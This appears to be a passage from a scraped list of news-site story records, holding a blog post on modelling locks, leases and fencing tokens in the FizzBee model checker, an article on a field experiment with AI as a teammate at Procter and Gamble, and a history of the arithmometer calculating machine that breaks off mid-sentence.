invariant that states that at most one process can be in the critical section at a time. Note that this model doesn’t actually enforce mutual exclusion, so I was just looking to see that the assertion was violated.\n\n123456789101112131415161718192021222324252627# Invariant to checkalways assertion MutualExclusion:return not any([p1.in_cs and p2.in_cs for p1 in processesfor p2 in processesif p1 != p2])NUM_PROCESSES = 2role Process:action Init:self.in_cs = Falseaction Next:# before critical sectionpass# critical sectionself.in_cs = Truepass# after critical sectionself.in_cs = Falsepassaction Init:processes = []for i in range(NUM_PROCESSES):processes.append(Process())\n\nThe “pass” statements are  no-ops, I just use them as stand-ins for “code that would execute before/during/after the critical section”.\n\nFizzBee is built on Starlark, which is a subset of Python, which why the model looks so Pythonic. Writing a FizzBee model felt like writing a PlusCal model, without the need for specifying labels explicitly, and also with a much more familiar syntax.\n\nThe lack of labels was both a blessing and a curse. In PlusCal, the control state is something you can explicitly reference in your model. This is useful for when you want to specify a critical section as an invariant. Because FizzBee doesn’t have labels, I had to create a separate variable called “in_cs” to be able to model when a process was in its critical section.  In general, though, I find PlusCal’s label syntax annoying, and I’m happy that FizzBee doesn’t require it.\n\nFizzBee has an online playground: you can copy the model above and paste it directly into the playground and click “Run”, and it will tell you that the invariant failed.\n\n1FAILED: Model checker failed. Invariant: MutualExclusion\n\nThe “Error Formatted” view shows how the two processes both landed on line 17, hence violating mutual exclusion:\n\nLocks\n\nNext up, I modeled locking in FizzBee. In general, I like to model a lock as a set, where taking the lock means adding the id of the process to the set, because if I need to, I can see:\n\nwho holds the lock by the elements of the set\n\nif two processes somehow manage to take the same lock (multiple elements in the set)\n\nHere’s my FizzBee mdoel:\n\n123456789101112131415161718192021222324252627282930313233343536373839always assertion MutualExclusion:return not any([p1.in_cs and p2.in_cs for p1 in processesfor p2 in processesif p1 != p2])NUM_PROCESSES = 2role Process:action Init:self.in_cs = Falseaction Next:# before critical sectionpass# acquire lockatomic:require not locklock.add(self.__id__)## critical section#self.in_cs = Truepassself.in_cs = False# release locklock.clear()# after critical sectionpassaction Init:processes = []lock = set()in_cs = set()for i in range(NUM_PROCESSES):processes.append(Process())\n\nBy default, each statement in FizzBee is treated atomically, and you can specify an atomic block to treat multiple statements automatically.\n\nIf you run this in the playground, you’ll see that the invariant holds, but there’s a different problem: deadlock\n\n12DEADLOCK detectedFAILED: Model checker failed\n\nFizzBee’s model checker does two things by default:\n\nChecks for deadlock\n\nAssumes that a thread can crash after any arbitrary statement\n\nIn the “Error Formatted” view, you can see what happened. The first process took the lock and then crashed. This leads to deadlock, because the lock never gets released.\n\nLeases\n\nIf we want to build a fault-tolerant locking solution, we need to handle the scenario where a process fails while it owns the lock. The Redlock algorithm uses the concept of a lease, which is a lock that expires after a period of time.\n\nTo model leases, we now need to model time. To keep things simple, my model assumes a global clock that all processes have access to.\n\n1234567891011121314151617181920212223242526272829303132333435363738394041NUM_PROCESSES = 2LEASE_LENGTH = 10always assertion MutualExclusion:return not any([p1.in_cs and p2.in_cs for p1 in processesfor p2 in processesif p1 != p2])action AdvanceClock:clock += 1role Process:action Init:self.in_cs = Falseaction Next:atomic:require lock.owner == None or \\clock >= lock.expiration_timelock = record(owner=self.__id__,expiration_time=clock+LEASE_LENGTH)# check that we still have the lockif lock.owner == self.__id__:# critical sectionself.in_cs = Truepassself.in_cs = False# release the lockif lock.owner == self.__id__:lock.owner = Noneaction Init:processes = []# global clockclock = 0lock = record(owner=None, expiration_time=-1)for i in range(NUM_PROCESSES):processes.append(Process())\n\nNow the lock has an expiration date, so we don’t have the deadlock problem anymore.  But the invariant is no longer always true.\n\nFizzBee also has a neat view called the “Explorer” where you can step through and see how the state variables change over time. Here’s a screenshot, which shows the problem:\n\nThe problem is that one process can think it holds the lock, but it the lock has actually expired, which means another process can take the lock, and they can both end up in the critical section.\n\nFencing tokens\n\nKleppmann noted this problem with Redlock, that it was vulnerable to issues where a process’s execution could pause for some period of time (e.g., due to garbage collection). Kleppmann proposed using fencing tokens to prevent a process from accessing a shared resource with an expired lock.\n\nHere’s how I modeled fencing tokens:\n\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152NUM_PROCESSES = 2LEASE_LENGTH = 10always assertion MutualExclusion:return not any([p1.in_cs and p2.in_cs for p1 in processesfor p2 in processesif p1 != p2])atomic action AdvanceClock:clock += 1role Process:action Init:self.in_cs = Falseaction Next:atomic:require lock.owner == None or \\clock >= lock.expiration_timelock = record(owner=self.__id__,expiration_time=clock+LEASE_LENGTH)self.token = next_tokennext_token += 1# can only enter the critical section# if we have the highest token seen so faratomic:if self.token > last_token_seen:last_token_seen = self.token# critical sectionself.in_cs = Truepass# after critical sectionself.in_cs = False# release the lockatomic:if lock.owner == self.__id__:lock.owner = Noneaction Init:processes = []# global clockclock = 0next_token = 1last_token_seen = 0lock = record(owner=None, expiration_time=-1)for i in range(NUM_PROCESSES):processes.append(Process())\n\nHowever, if you run this through the model checker, you’ll discover that the invariant is also violated!\n\nIt turns out that fencing tokens don’t protect against the scenario where two processes both believe they hold the lock, and the lower token reaches the shared resource before the higher token:\n\nA scenario where fencing tokens don’t ensure mutual exclusion\n\nI reached out to Martin Kleppmann to ask about this, and he agreed that fencing tokens would not protect against this scenario.\n\nImpressions\n\nI found FizzBee surprisingly easy to get started with, although I only really scratched the surface here. In my case, having experience with PlusCal helped a lot, as I already knew how to write my specifications in a similar style. You can write your specs in TLA+ style, as a collection of atomic actions rather than as one big non-atomic action, but the PlusCal-style felt more natural for these particular problems I was modeling.\n\nThe Pythonic syntax will be much more familiar to programmers than PlusCal and TLA+, which should help with adoption. In some cases, though I found myself missing the conciseness of the set notation that languages like TLA+ and Alloy support. I ended up leveraging Python’s list comprehensions, which have a set-builder-notation feel to them.\n\n Newcomers to formal specification will still have to learn how to think in terms of TLA+ style models: while FizzBee looks like Python, conceptually it is like TLA+, a notation for specifying a set of state-machine behaviors, which is very different from a Python program. I don’t know what it will be like for learners.\n\nI was a little bit confused by FizzBee’s default behavior of a thread being able to crash at any arbitrary point, but that’s configurable, and I was able to use it to good effect to show deadlock in the lock model above.\n\nFinally, while I read Kleppmann’s article years ago, I never noticed the issue with fencing tokens until I actually tried to model it explicitly. This is a good reminder of the value of formally specifying an algorithm. I fooled myself into thinking I understood it, but I actually hadn’t. It wasn’t until I went through the exercise of modeling it that I discovered something about its behavior that I hadn’t realized before.\nShare this:TwitterFacebookLike Loading...\n\nFutexes in TLA+October 5, 2024In \"formal methods\"Modeling a CLH lock inTLA+August 4, 2024In \"formal methods\"Reproducing a Java 21 virtual threads deadlock scenario withTLA+August 1, 2024In \"formal methods\"\n\n\t\t\t\t\tPublished by Lorin Hochstein\n\n\t\t\t\t\tView all posts by Lorin Hochstein\n\n\t\t\tPublished\n\t\t\tMarch 3, 2025March 3, 2025",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "c9d4c74469cb3d9b",
    "title": {
      "en": "The Cybernetic Teammate",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.oneusefulthing.org/p/the-cybernetic-teammate",
    "score": 31,
    "by": "tobr",
    "time": 1742647947,
    "content": "Share this postOne Useful ThingThe Cybernetic TeammateCopy linkFacebookEmailNotesMoreDiscover more from One Useful ThingTrying to understand the implications of AI for work, education, and life. By Prof. Ethan MollickOver 272,000 subscribersSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.Already have an account? Sign inThe Cybernetic TeammateHaving an AI on your team can increase performance, provide expertise, and improve your experienceEthan MollickMar 22, 2025319Share this postOne Useful ThingThe Cybernetic TeammateCopy linkFacebookEmailNotesMore3142ShareOver the past couple years, we have learned that AI can boost the productivity of individual knowledge workers ranging from consultants to lawyers to coders. But most knowledge work isn’t purely an individual activity; it happens in groups and teams. And teams aren't just collections of individuals – they provide critical benefits that individuals alone typically can't, including better performance, sharing of expertise, and social connections. So, what happens when AI acts as a teammate? This past summer we conducted a pre-registered, randomized controlled trial of 776 professionals at Procter and Gamble, the consumer goods giant, to find out.We are ready to share the results in a new working paper: The Cybernetic Teammate: A Field Experiment on Generative AI Reshaping Teamwork and Expertise. Given the scale of this project, it shouldn’t be a surprise that this paper was a massive team effort coordinated by the Digital Data Design Institute at Harvard and led by Fabrizio Dell’Acqua, Charles Ayoubi, and Karim Lakhani, along with Hila Lifshitz, Raffaella Sadun, Lilach Mollick, me, and our partners at Procter and Gamble: Yi Han, Jeff Goldman, Hari Nair, and Stewart Taub. We wanted this experiment to be a test of real-world AI use, so we were able to replicate the product development process at P&G, thanks to the cooperation and help of the company (which had no control over the results or data). To do that, we ran one-day workshops where professionals from Europe and the US had to actually develop product ideas, packaging, retail strategies and other tasks for the business units they really worked for, which included baby products, feminine care, grooming, and oral care. Teams with the best ideas had them submitted to management for approval, so there were some real stakes involved.We also had two kinds of professionals in our experiment: commercial experts and technical R&D experts. They were generally very experienced, with over 10 years of work at P&G alone. We randomly created teams consisting of one person in each specialty. Half were given GPT-4 or GPT-4o to use, and half were not. We also picked a random set of both types of specialists to work alone, and gave half of them access to AI. Everyone assigned to the AI condition was given a training session and a set of prompts they could use or modify. This design allowed us to isolate the effects of AI and teamwork independently and in combination. We measured outcomes across multiple dimensions including solution quality (as determined by at least two expert judges per solution), time spent, and participants' emotional responses. What we found was interesting.AI boosts performanceWhen working without AI, teams outperformed individuals by a significant amount, 0.24 standard deviations (providing a sigh of relief for every teacher and manager who has pushed the value of teamwork). But the surprise came when we looked at AI-enabled participants. Individuals working with AI performed just as well as teams without AI, showing a 0.37 standard deviation improvement over the baseline. This suggests that AI effectively replicated the performance benefits of having a human teammate – one person with AI could match what previously required two-person collaboration.Teams with AI performed best overall with a 0.39 standard deviation improvement, though the difference between individuals with AI and teams with AI wasn't statistically significant. But we found an interesting pattern when looking at truly exceptional solutions, those ranking in the top 10% of quality. Teams using AI were significantly more likely to produce these top-tier solutions, suggesting that there is value in having human teams working on a problem that goes beyond the value of working with AI alone.Both AI-enabled groups also worked much faster, saving 12-16% of the time spent by non-AI groups while producing solutions that were substantially longer and more detailed than those from non-AI groups.Expertise boundaries vanishWithout AI, we saw clear professional silos in how people approached problems. R&D specialists consistently proposed technically-oriented solutions while Commercial specialists suggested market-focused ideas. When these specialists worked together in teams without AI, they produced more balanced solutions through their cross-functional collaboration (teamwork wins again!).But this was another place AI made a big difference. When paired with AI, both R&D and Commercial professionals, in teams or when working alone, produced balanced solutions that integrated both technical and commercial perspectives. The distinction between specialists virtually disappeared in AI-aided conditions, as you can see in the graph. We saw a similar effect on teams.This effect was especially pronounced for employees less familiar with product development. Without AI, these less experienced employees performed relatively poorly even in teams. But with AI assistance, they suddenly performed at levels comparable to teams that included experienced members. AI effectively helped people bridge functional knowledge gaps, allowing them to think and create beyond their specialized training, and helped amateurs act more like experts.Working with AI led to better emotional experiencesA particularly surprising finding was how AI affected the emotional experience of work. Technological change, and especially AI, has often been associated with reduced workplace satisfaction and increased stress. But our results showed the opposite, at least in this case.Positive emotions increase and negative emotions decrease after working with AI compared to teams and individuals who did not have AI access.People using AI reported significantly higher levels of positive emotions (excitement, energy, and enthusiasm) compared to those working without AI. They also reported lower levels of negative emotions like anxiety and frustration. Individuals working with AI had emotional experiences comparable to or better than those working in human teams. While we conducted a thorough study that involved a pre-registered randomized controlled trial, there are always caveats to these sorts of studies. For example, it is possible that larger teams would show very different results when working with AI, or that working with AI for longer projects may impact its value. It is also possible that our results represent a lower bound: all of these experiments were conducted with GPT-4 or GPT-4o, less capable models than what are available today; the participants did not have a lot of prompting experience so they may not have gotten as much benefit; and chatbots are not really built for teamwork. There is a lot more detail on all of this in the paper, but limitations aside, the bigger question might be: why does this all matter?Why This MattersOrganizations have primarily viewed AI as just another productivity tool, like a better calculator or spreadsheet. This made sense initially but has become increasingly limiting as models get better and as recent data finds users most often employ AI for critical thinking and complex problem solving, not just routine productivity tasks. Companies that focus solely on efficiency gains from AI will not only find workers unwilling to share their AI discoveries for fear of making themselves redundant but will also miss the opportunity to think bigger about the future of work. To successfully use AI, organizations will need to change their analogies. Our findings suggest AI sometimes functions more like a teammate than a tool. While not human, it replicates core benefits of teamwork—improved performance, expertise sharing, and positive emotional experiences. This teammate perspective should make organizations think differently about AI. It suggests a need to reconsider team structures, training programs, and even traditional boundaries between specialties. At least with the current set of AI tools, AI augments human capabilities. It democratizes expertise as well, enabling more employees to contribute meaningfully to specialized tasks and potentially opening new career pathways.The most exciting implication may be that AI doesn't just automate existing tasks, it changes how we can think about work itself. The future of work isn't just about individuals adapting to AI, it's about organizations reimagining the fundamental nature of teamwork and management structures themselves. And that's a challenge that will require not just technological solutions, but new organizational thinking.SubscribeLeave a comment319 Likes∙42 Restacks319Share this postOne Useful ThingThe Cybernetic TeammateCopy linkFacebookEmailNotesMore3142SharePrevious",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "28804a3277d35500",
    "title": {
      "en": "Making the Arithmometer Count",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.mhs.ox.ac.uk/staff/saj/arithmometer/",
    "score": 9,
    "by": "gene-h",
    "time": 1742392955,
    "content": "Making the arithmometer count\n\nIntroduction\n\nThe arithmometer of Charles Xavier Thomas de Colmar (1785-1870) has a firmly established place in the history of computing. While the lion’s share of recent scholarly attention has been lavished on Charles Babbage’s difference and analytical engines, historians examining calculation in the 19th century have nevertheless repeatedly affirmed the importance of Thomas’s device. Typical characterisations are remarkably uniform: ‘the first multiplication machine to be made commercially for general sale’, ‘the first commercially successful calculator’ and ‘the first commercial calculating machine’.1\n\nThe arithmometer was not however the first machine to accomplish the four basic arithmetical operations of addition, subtraction, multiplication and division – earlier machines such as those of Hahn and Müller had achieved this level of functionality in the 18th century.2 But the implied virtues of the arithmometer are clear. Lacking the mathematical ambition driving the work of Babbage and his followers, the machine was solid, dependable and successful, an industrial product manufactured in quantity.\n\nYet despite this apparent consensus there are striking problems with standard accounts of the arithmometer. Rather than a smooth passage to success, I will suggest that the machine’s early decades witnessed a different and more troubled trajectory, in which the mechanical and public character of the arithmometer was repeatedly transformed. This process of development took place over an extraordinarily protracted period. Although first made public in 1820, a lengthy report of 1878 remarked that the arithmometer had still not taken its ‘rightful’ place in industry.3 Perhaps this perception of failure should be attributed to the overoptimistic expectations of a sympathetic advocate. But the widespread acceptance of the arithmometer cannot be dated much before the late 1870s. Only then was the machine deemed sufficiently successful to be worth copying, when arithmometer ‘clones’ were first manufactured in Germany by Burkhardt and, slightly later, in Britain.4\n\nIn this paper I focus on the period of more than 50 years between the invention of the machine and its establishment as an accepted instrument of calculation. I examine three aspects of the arithmometer’s early history: its development as a mechanism, the means used to publicly promote it and the concrete ways in which it was adopted by an expanding circle of users. This multiple approach seeks to reveal the technical, promotional and personal investment required before the arithmometer could be ‘counted on’, not just in the straightforward arithmetical sense but also counted on as a reliable resource for a whole range of potential users.\n\nDesign and development\n\nExamples of the arithmometer survive in many public and private collections. Yet despite its easily recognisable outward appearance, we should be wary of discussing the arithmometer, as if the machine existed in a single unchanging form. A few of the machine’s basic principles did remain constant but almost every feature of their implementation was altered by Thomas. Moreover, the long list of internal and external changes does not represent simply a uniform sequence of improvement. In some of the most important instances of redesign Thomas did not just rectify or add to an existing model; rather, he attempted to redefine the character and the ambitions of the machine, and thus its possible market.\n\nFigure 1\n\nFigure 2\n\nThe familiar features of the mature version of the arithmometer provide a convenient standpoint from which to survey its changing form and operation. The machine presents two principal parts, a fixed setting plate with a series of sliders for inputting numbers (fig. 1: A), and a movable carriage where results appear (fig. 1: M). A number set with the sliders is mechanically transferred to the result dials on the carriage (fig. 1: C) by turning the handle (fig. 1: N). This transfer operation, basic to all the arithmometer’s workings, is accomplished using the celebrated stepped cylinders first introduced by Leibniz.\n\nEach cylinder carries 9 teeth whose length increases stepwise (fig. 2: A). The cylinder’s teeth engage a pinion (fig. 2: B) whose position is controlled by the setting slider (fig. 2: C). The higher the number set by the slider, the larger the number of teeth on the cylinder engaging the pinion. When the handle is turned the cylinder rotates and as a result the pinion’s square arbor (fig. 2: F) is turned through an arc proportional to the value set on the slider. It is this rotation which is communicated to the result dial (fig. 2: K) via a bevel wheel (fig. 2: G). One turn of the handle adds the value set on the sliders to the result dials and, since multiplication is simply repeated addition, turning the handle, say, 5 times multiplies the given number by 5. To multiply by 25 it is not necessary to turn the handle 25 times. Rather, after turning it 5 times the carriage is moved one step to the right and the handle then turned two times.\n\nUsing the reversing switch on the setting plate (fig. 1: B), the machine can be set to perform subtraction and division. Figure 2 shows the result of pushing the switch: M slides forward, disengaging the bevel wheel G from I (on the axis of the result dial K) and bringing H into contact with I. Now when a turn of the handle causes arbor F to turn, I – and thus the result dial – rotates in the opposite direction, reducing rather than increasing the displayed value. A turn of the handle thus subtracts the number set on the sliders from a number entered on the result dials.\n\nAs multiplication is repeated addition, so division is repeated subtraction, with the quotient appearing in the smaller set of dials on the carriage (fig. 1: D). These quotient dials are simply counters: each turn of the handle increments the dial currently in contact with the counting mechanism by one unit. The quotient dials are also useful in multiplication, since they provide a visual check on the value [page 13:] of the multiplier. Finally, when a calculation is complete, the carriage dials can be reset to zero: each set of dials has an independent zeroing mechanism operated by twisting one of the two knurled knobs at either end of the carriage (fig. 1: O and P).\n\nThe engraving in figure 1 is from an instruction booklet of 1865. Some measure of the operational transformation of the arithmometer can be gained by turning back to the debut of the machine.\n\nFigure 3\n\nFigure 4\n\nFigure 5\n\nThomas’s arithmometer was first made public in 1820 when he was granted a five year patent for his calculating machine (fig. 3).5 It is clear however that the patent represents only a transient prototype, on which Thomas was still actively working. By 1821, when he was ready to submit an example to the scrutiny of the Société d’encouragement pour l’industrie nationale, the design had already moved on significantly. The Société’s Bulletin first featured a short report on the arithmometer and then a longer illustrated memoir.6 A machine almost identical to the engraved design of 1821 survives in the Smithsonian’s National Museum of American History (figs 4 and 5).7 The inscription on the setting plate records not only the machine’s inventor but also – apparently uniquely on a surviving Thomas machine – who actually made it, the Parisian mécanicien and clockmaker, Devrine.8\n\nBy comparison with figure 1, several features stand out in these early designs. To focus primarily on the Smithsonian machine, it clearly has a smaller capacity: there are only three setting sliders. Alongside these sliders there is a fourth slot identified as the ‘multiplicateur’, which is conspicuously absent from the machine of the 1860s. The multiplicateur was intended to abbreviate multiplication and division. Setting a figure on the multiplicateur and actuating the machine caused the stepped cylinders to rotate the desired number of times. Thus, in multiplying by eight, for example, a single operation was required rather than the repetition of eight actions.9\n\nThe carriage contains no quotient dials but only a series of paired result dials. Without a switch on the setting plate to alter these dials’ direction of rotation, subtraction and division are accomplished by an alternative and less direct route. Each result dial carries two concentric sequences of numbers, one increasing for addition the other decreasing for subtraction. In revealing one sequence the other is hidden, so the user had to choose the appropriate number sequence for the desired operation. (Pascal had resorted to similar means in his 17th-century adding machine.) Each of these dials has to be individually reset by twisting the knob mounted on its axis: there is no general zeroing mechanism. Finally, it is perhaps easy to overlook the lack of a handle. Instead there is a silk ribbon which is pulled outwards to set the machine in motion.\n\nEven dwelling only on external features makes clear the substantial gap between the early versions of the arithmometer and those of the 1860s. However, the development path from one to the other was neither straightforward nor steady. After the initial fanfare of favourable reports in the Bulletin of the Société d’encouragement, nothing further seems to have been heard of the arithmometer for more than 20 years. At this stage in its development the machine appears no different from the many earlier arithmetical machines that had been announced, had demonstrated their feasibility through working prototypes and then sunk without further trace.\n\nLater publicity material claimed that Thomas had worked incessantly to develop the machine from 1820 onwards,10 but the apparent absence of any promotional effort for over two decades warrants at least some scepticism over such claims. Nor would it be surprising if the arithmometer had been set aside. Thomas was not a mechanician whose professional success rested on his ability to create and sell a working commercial machine. Rather, he was the director of an insurance company, and was presumably preoccupied with this work for most of his professional life.11\n\nHowever, the arithmometer did re-emerge. A machine of unknown design was displayed at the 1844 French national exhibition and, by at least 1848, a thorough redesign had been carried out. The ribbon drive was dispensed with and replaced by a crank handle inserted into the front of the box. The capacity was increased to five setting sliders and 10 result dials. The multiplicateur slide was retained from the 1820s machine but must have had a new mechanism, while there was now a wing nut on the setting plate for switching between addition and subtraction, dispensing with the doubly numbered result dials.12\n\nFigure 6\n\nFigure 7\n\nThese changes heralded a decade of further development, the most intensive in the arithmometer’s history. A patent for a new and more compact machine was obtained in 1850.13 As well as the reduction in size, the position of the handle was altered and a zeroing mechanism added (fig. 6). But this model was, in turn, quickly superseded by another new machine in 1852 (fig. 7).14 As well as incorporating some relatively cosmetic changes, such as a new form for the add/subtract switch and for the zeroing button, the 1852 machine also marked a more fundamental departure in Thomas’s approach and strategy. While the succession of previous models had incorporated mechanical changes, they had nevertheless retained the same functional elements. The new model of 1852 jettisoned the multiplicateur, making the machine simpler (and therefore presumably [page 14:] cheaper to construct), but in effect less powerful. The user rather than the machine now had to keep count of the turns of the handle, especially when performing division.\n\nThomas evidently experimented with means to supply this lack,15 but it was not until 1858 that the absence was definitively remedied by the introduction of quotient dials on the carriage.16 By this stage the arithmometer had, outwardly at least, achieved its classic form, though it was not until the mid-1860s that the quotient dials received their own zeroing mechanism.\n\nThis sketch of the changing form of the arithmometer has only covered some of its more obvious and external alterations, those which reveal the changing options and operations available to a user. But these do not necessarily represent the machine’s most significant transformations. The development and ultimate abandonment of the multiplicateur required major internal redesign, for example. However, contemporaries agreed that the most challenging task for the devisor of calculating machines lay in the creation of the tens carry mechanism.17 Without delving into the mechanical intricacies, we can note that Thomas redesigned this element more than any other: the arithmometer exhibits at least 5 distinct mechanisms up to the 1860s. These alterations responded to publicly voiced concerns about the delicacy of the tens carry, and sought to guarantee robustness by reducing the reliance on springs as transmitters of force.18\n\nThe hidden revisions to the arithmometer’s innards extended beyond the sensitive element of tens carry to such basic features as the drive transmission, which was altered from a gear train to a shaft. Such internal alterations provide probably the best evidence that the performance of the machine was open to improvement. Even that most fundamental mechanical organ of the machine, the stepped cylinder, did not remain unaltered. Although its wording and illustration is obscure, and there is no surviving machine available for clarification, it is clear from the 1820 patent that Thomas’s initial design for the cylinder incorporated an additional tooth, subsequently discarded, which was engaged as part of the tens carry mechanism. Moreover, rather than 9 stepped teeth the Smithsonian example’s cylinders have 18, arranged in pairs.\n\nAlthough further refinements would continue to be introduced by Thomas’s business successors and their competitors, by the 1860s arithmometers were being produced in a form which remained relatively stable until the First World War. This familiar form of the arithmometer may clothe it in a guise of solidity and permanence. But by surveying the machine’s technical development we can see how shifting and fragile was its identity over a period of 50 years.\n\nPromotion and competition\n\nFocusing on the machine itself provides one strand of development. But how did the arithmometer fare in the public realm? The arithmometer had first become public when it was patented in 1820. This claim expired after 5 years and it was not until 1850 that fresh legal rights were obtained. From this point a more systematic policy was pursued, and the 15 year rights were extended and renewed in 1865 and 1880.\n\nWhile the patent documents included mechanical description and illustration, such information was also made accessible by other forms of publication. Machines were offered to learned and improving societies with the expectation that they would be reviewed. The reports on the construction and use of the arithmometer for the Société d’encouragement in 1821, 1822, 1851 – when it was awarded a gold medal – and, after Thomas’s death, in 1878 have already been cited. A machine was also presented to the Académie des Sciences in 1854 and a report duly followed later the same year.19\n\nPatent specifications and journal reports thus repeatedly served as a medium for accounts of the arithmometer, typically focusing narrowly on the form and operation of the machine itself. However, the contexts in which the machine was communicated and assessed multiplied from the 1840s. Exhibitions, newspapers, popular scientific periodicals and promotional material on behalf of the machine all offered the arithmometer to a wider audience.\n\nWhen presented through these media the arithmometer was placed in open competition with other devices. Although now often presented as a lone pioneer,20 the arithmometer jostled with other machines for attention and acclaim. Far from being a self-evident success it was frequently ranked as merely second best in its class. The public career of the arithmometer in the 1840s and ’50s suggests how much work was required to establish the name and reputation of Thomas’s machine.\n\nThomas first ventured into the world of exhibitions when the arithmometer was revived in 1844. A machine was entered in the French national exhibition of industrial products where it was classed amongst precision instruments in a category of ‘diverse measures, counters and calculating machines’. If Thomas had hoped for substantial recognition and reward, he was to be disappointed. The arithmometer was granted an honourable mention in the jury report but was clearly considered inferior to the submission of the Hungarian emigré doctor Didier Roth, who obtained a bronze medal for his adding and calculating machines and counters. Roth had been actively promoting his adding machines since 1842 and had received a favourable report from the Société d’encouragement in 1843. The judgement of the 1844 jury was mirrored in the coverage given to Roth in a separate guide to the exhibition’s highlights, in which Roth’s adding machine was described and illustrated, while the arithmometer was ignored.21\n\nThe next French national exhibition took place in 1849 and Thomas again tried his luck. On this occasion he was awarded a silver medal and the jury report devoted three pages to his machine.22 However, despite this higher honour, he was again eclipsed, for a gold model went to the mechanicians Maurel and Jayet for their ‘arithmaurel’, a calculating machine with automatic capabilities judged to exceed those of the arithmometer. [page 15:]\n\nA further competitive opportunity was soon offered by the 1851 Great Exhibition. But again, Thomas was frustrated. The arithmometer was one of two calculating machines to receive a prize medal, but the jury decided that it was inferior to a Russian entry devised by Israel Abraham Staffel, originally a watchmaker from Warsaw. The arithmometer was illustrated in the official catalogue, but it was Staffel’s calculator, already successful at a Polish exhibition and rewarded in St Petersburg, which was featured in the Illustrated London News.23\n\nAfter his succession of defeats Thomas embarked on a far more active promotion of the arithmometer. His next challenge was to be the 1855 exhibition in Paris and he evidently determined to secure international victory on French soil. Thomas campaigned both through the press and in commissioned publications. He also engaged in the rituals of patronage, rituals that we might more readily associate with the decoratively elaborate calculating machines of the 18th century.\n\nIn the early 1850s Thomas distributed examples of the arithmometer to numerous crowned and titled heads of Europe. Surviving examples of these presentation machines are individually ornamented with engraved dedications on scrollwork inside the case lid.24 Thomas’s direct reward for these arithmometer gifts was a series of at least a dozen honours granted between 1851 and 1855. He was named to a stream of chivalric orders, received gold and diamond gifts in recompense for his invention and, in 1857, was elevated from Chevalier to Officer of the Légion d’Honneur.25 Aside from this personal accumulation, Thomas was able to make abundant use of these decorations in promotional material for the arithmometer, listing them to indicate the endorsements he had received from the European elite. Such efforts to raise the profile of the arithmometer placed it within a world of honour and prestige, far removed from the commercial marketplace to which the machine is usually assigned in historical accounts. Clearly the arithmometer cannot be identified as an exclusively industrial product.26\n\nFigure 8\n\nIn planning for the 1855 exhibition Thomas envisioned his chief rival to be the arithmaurel which had captured so much interest at its first public appearance in 1849 (fig. 8). Subsequently awarded the prix de mécanique of the Fondation Montyon this machine had been undergoing continued development and was evidently seen as a threat to the arithmometer’s prospects. Thomas set about garnering positive publicity for his most recently developed model.\n\nThe arithmaurel and the arithmometer were juxtaposed in the pages of the Annales des Ponts et Chaussées in 1854 when each was made the subject of a separate memoir. Both reports were favourable but, apart from noting that the arithmaurel made use of the stepped cylinder which had earlier been incorporated by Thomas, there was little in the way of direct comparison.27 The stakes were raised by an 1854 article in the scientific review Cosmos, in which the abbé Moigno not only looked forward to the forthcoming exhibition struggle between the two machines but also gave his opinion of the likely outcome. Moigno moved the contest away from the staid and careful prose of official reports and presented it as journalistic high drama.28 He acknowledged his own previous championing of Maurel and Jayet but now sought to press the claims of Thomas. Not only had Thomas’s priority been overlooked but the superior potential of the arithmometer had lain unrecognised. The arithmaurel was still to be classed as a machine of the highest ingenuity. Yet Moigno reminded his readers that the best could be the enemy of the good. Maurel and Jayet had produced a powerful machine but had not yet been able to either expand its operational capacity or render it suitable for the commercial market. Thomas on the contrary had already supervised the construction of many arithmometers and there was no mechanical hindrance to the expansion of the machine’s capacity. The arithmometer may have appeared slower and more in need of human action and intelligence, but Moigno turned such evaluations on their head. The simplicity and solidity of the arithmometer identified it as the ‘classical’ instrument, representing the absolute good, while the arithmaurel was damned by its transcendence, a romantic instrument symbolising only a beautiful ideal.\n\nThomas presumably prompted or supported these publications in some way but, whatever the manoeuvres, they are now lost.29 His intervention is much clearer in another text from the period immediately preceding the Paris exhibition. The innocuously titled Histoire des nombres et de la numération mécanique appeared in 1855 over the name of Jacomy-Régnier, otherwise apparently best-known for a lengthy treatise on conjugal morality. Whatever expectations its title suggests, this work turns out to be a 100 page promotional puff for Thomas. Mustering not just the history of mechanical calculation but the history of arithmetic itself, Thomas is celebrated in extravagant terms. Where the surpassing acuity of a Pascal or a Leibniz had failed, Thomas had finally succeeded in creating a genuine calculating machine. Extraordinarily purple passages elevate the arithmometer to the status of a finely honed product of genius, its clarity of purpose matching a deeply considered simplicity of construction. But whereas Thomas’s achievement ought to have been the glory of the age and of the French nation, his rewards had been few and middling, with recognition bestowed more readily beyond the boundaries of France than within them.\n\nThe supply of personal anecdote and quotation reveals Thomas’s participation in this promotional venture, and its message suggests his direct support. Dark comments on the inadequacy of jury procedures witness his disappointment at previous exhibition verdicts on the arithmometer. Significantly, the only other machines to be given appreciative mention are the three which had already defeated the arithmometer. But each is quickly dispatched. Roth’s machine, although a practical device, is merely for addition. The arithmaurel rests on Thomas’s prior innovation of the stepped cylinder mechanism and is in any case both mechanically delicate and prohibitively expensive, qualities which apply likewise to the Staffel machine. Of these three, only the arithmaurel would stand as rival to the arithmometer at the forthcoming exhibi- [page 16:] tion, and Thomas had hit on a strategy to outflank this competitor.\n\nFigure 9\n\nMoigno had reported on the difficulties facing Maurel and Jayet in building an arithmaurel with a results capacity of 8 figures. Thomas faced no such problems. In the previous four years he had seen the completion of more than 200 10-figure and 50 16-figure machines.30 To drive home this advantage of capacity Thomas created a giant machine especially for the exhibition. Some 6 feet long, equipped with 15 setting sliders and 30 result dials, and encased in fine cabinetwork the result was evidently meant to capture more than technical interest (fig. 9).31\n\nAdvance reports of this calculating leviathan were already circulating before the exhibition itself. The record of a meeting of the Académie des Sciences in the pages of Cosmos again allowed the abbé Moigno the opportunity to trumpet the arithmometer’s merits. As well as citing the conclusions of recent reports he announced that Thomas’s giant machine would ‘strike a final grand blow’ against objections, resistance or inertia which might still impede the arithmometer’s progress.32\n\nAfter this extensively orchestrated preparation, the initial signs from the exhibition itself were encouraging. A guidebook reported in its section on precision instruments that the giant arithmometer was the centre of lively interest. Thomas would have been satisfied to note that the arithmaurel appears only as an afterthought, an additional item also worth viewing. Yet in this moment of triumph there was a small cloud on the horizon. The same volume reported 